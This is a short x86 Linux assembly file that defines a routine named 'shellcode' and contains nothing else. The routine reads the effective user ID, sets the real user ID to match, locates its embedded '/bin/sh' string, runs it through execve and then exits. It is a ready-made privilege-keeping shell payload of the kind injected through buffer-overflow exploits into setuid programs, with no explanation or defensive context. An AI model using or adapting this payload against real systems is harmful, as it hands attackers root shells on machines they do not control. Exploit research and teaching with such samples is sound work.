.text
.globl shellcode
shellcode:
xorl %eax,%eax
movb $0x31,%al
int $0x80
xchgl %eax,%ebx
xorl %eax,%eax
movb $0x17,%al
int $0x80
.byte 0x68
popl %ecx
popl %eax
jmp *%ecx
call *%esp
xorl %eax,%eax
cltd
movl %ecx,%edi
movb $'/'-1,%al
incl %eax
scasb %es:(%edi),%al
jne -3
movl %edi,(%ecx)
movl %edx,4(%ecx)
movl %edi,%ebx
incl %eax
scasb %es:(%edi),%al
jne -3
movb %dl,-1(%edi)
movb $0x0B,%al
int $0x80
xorl %eax,%eax
incl %eax
xorl %ebx,%ebx
int $0x80
.byte '/'
.string "/bin/sh0"
